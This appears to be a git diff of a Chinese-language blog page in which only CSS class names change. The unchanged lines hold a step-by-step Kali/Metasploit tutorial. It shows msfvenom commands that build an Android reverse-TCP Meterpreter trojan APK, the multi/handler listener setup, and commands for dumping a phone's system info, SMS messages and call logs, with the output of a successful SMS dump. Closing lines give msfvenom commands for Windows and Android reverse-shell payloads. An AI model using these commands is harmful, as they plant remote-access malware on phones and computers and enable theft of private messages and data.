@@ -231,7 +231,7 @@
 </ol>
 
 <h2 id="go">go</h2>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.启动kali系统，打开命令行。  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.启动kali系统，打开命令行。  
 
 2.su        -》 进入root模式。
 
@@ -242,7 +242,7 @@
 <img src="/images/posts/kaliMSF/1.png" alt="" width="80%" height="80%" /><br />
 <br /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4.msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.114 lport=3369 &gt; muma.apk     
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4.msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.114 lport=3369 &gt; muma.apk     
  -》  lhost是kali的IP；lport随便写一个没有被占用的端口号就可以，记住，后面有用到；文件名随便写，后缀是 .apk 就行。
  如下图所示，此时木马文件已经生成，在 /home/kali  目录下。
 </code></pre></div></div>
@@ -251,28 +251,28 @@
 <img src="/images/posts/kaliMSF/2.png" alt="" width="80%" height="80%" /><br />
 <br /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5.在 /home/kali 目录下找到生成的muma.apk文件。
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5.在 /home/kali 目录下找到生成的muma.apk文件。
 </code></pre></div></div>
 
 <p><br />
 <img src="/images/posts/kaliMSF/3.png" alt="" width="80%" height="80%" /><br />
 <br /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6. 我通过合法手段将木马文件安装在了我的测试机上。 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6. 我通过合法手段将木马文件安装在了我的测试机上。 
 </code></pre></div></div>
 
 <p><br />
 <img src="/images/posts/kaliMSF/4.jpeg" alt="" width="30%" height="30%" /><br />
 <br /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7. msfconsole     -》 启动 kali 内置的 msfconsole 工具。
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7. msfconsole     -》 启动 kali 内置的 msfconsole 工具。
 </code></pre></div></div>
 
 <p><br />
 <img src="/images/posts/kaliMSF/5.png" alt="" width="80%" height="80%" /><br />
 <br /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>8.配置参数：   
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>8.配置参数：   
 
 use exploit/multi/handler     -》 （选择模块）
 
@@ -289,13 +289,13 @@ run   -》 开始监听
 <img src="/images/posts/kaliMSF/6.png" alt="" width="80%" height="80%" /><br />
 <br /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>9. 在靶机上点击刚刚安装的木马程序，并观察监听程序窗口，出现meterpreter你就已经成功的入侵。
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>9. 在靶机上点击刚刚安装的木马程序，并观察监听程序窗口，出现meterpreter你就已经成功的入侵。
 </code></pre></div></div>
 <p><br />
 <img src="/images/posts/kaliMSF/7.png" alt="" width="80%" height="80%" /><br />
 <br /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 一些入侵命令  
 
 1.查看对方手机系统信息
@@ -320,7 +320,7 @@ run   -》 开始监听
 
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>如下图所示，这里成功的拿到了手机系统信息，以及所有短信，在 sms_dump_20221123021710.txt 这里。
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>如下图所示，这里成功的拿到了手机系统信息，以及所有短信，在 sms_dump_20221123021710.txt 这里。
 当出现 [-] Error running command dump_calllog: Rex::TimeoutError Operation timed out，这个信息时，
 则与靶机断开了连接，需要先退出监听 exit ，然后 重新运行 run ，再次在靶机上点击木马程序。
 
@@ -345,7 +345,7 @@ run   -》 开始监听
 <h2 id="其它">其它</h2>
 
 <p>你不只可以生成android手机的后台程序，还可以</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>windows
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>windows
 msfvenom -p windows/meterpreter/reverse_tcp LPORT=控制机端口 LHOST=控制机ip -f -o shell.exe
 安卓app:
 msfvenom -p android/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口 -o test2.apk
